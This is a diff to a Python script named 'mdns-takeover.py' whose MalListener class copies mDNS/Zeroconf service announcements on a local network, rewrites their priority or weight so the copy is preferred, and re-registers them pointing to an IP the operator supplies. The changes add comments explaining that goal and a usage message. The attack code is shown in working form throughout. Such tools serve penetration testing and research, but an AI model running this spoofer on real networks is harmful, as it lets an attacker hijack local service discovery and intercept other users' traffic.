@@ -14,9 +14,9 @@ class MalListener:
     def add_service(self, zeroconf, type, name):
         info = zeroconf.get_service_info(type, name)
         print("Copying: %s" % (info,))
-        if not name in self.names:
+        if not name in self.names: #if we haven't yet copied this, do so
             print("Copying: %s" % (info,))
-            if info.priority > 0:
+            if info.priority > 0: #Try to pick a priority/weight that will make us chosen most of the time
                 info.priority = 0
             else:
                 info.weight = (info.weight + 1) * 10
@@ -26,9 +26,9 @@ class MalListener:
         
     def update_service(self, zeroconf, type, name):
         info = zeroconf.get_service_info(type, name)
-        if not name in self.names:
+        if not name in self.names:#if we haven't yet copied this, do so
             print("Copying: %s" % (info,))
-            if info.priority > 0:
+            if info.priority > 0: #Try to pick a priority/weight that will make us chosen most of the time
                 info.priority = 0
             else:
                 info.weight = (info.weight + 1) * 10
@@ -36,15 +36,18 @@ class MalListener:
             self.names.append(name)
             zc.register_service(info)
 
-zc = Zeroconf(ip_version=IPVersion.V4Only)
-ml = MalListener()
-ml.ip = socket.inet_aton(socket.gethostbyname(socket.gethostname()))
-ml.ip = socket.inet_aton(sys.argv[2])
-zone = sys.argv[1]
-browser = ServiceBrowser(zc, zone, ml)
+if len(sys.argv) == 3:
+    zc = Zeroconf(ip_version=IPVersion.V4Only)
+    ml = MalListener()
+    ml.ip = socket.inet_aton(socket.gethostbyname(socket.gethostname()))
+    ml.ip = socket.inet_aton(sys.argv[2])
+    zone = sys.argv[1]
+    browser = ServiceBrowser(zc, zone, ml)
 
-try:
-    input("Press enter to exit...\n\n")
-finally:
-    zc.unregister_all_services()
-    zc.close()
+    try:
+        input("Press enter to exit...\n\n")
+    finally:
+        zc.unregister_all_services()
+        zc.close()
+else:
+    print("Usage: python3 mdns-takeover.py <zone> <ip>")
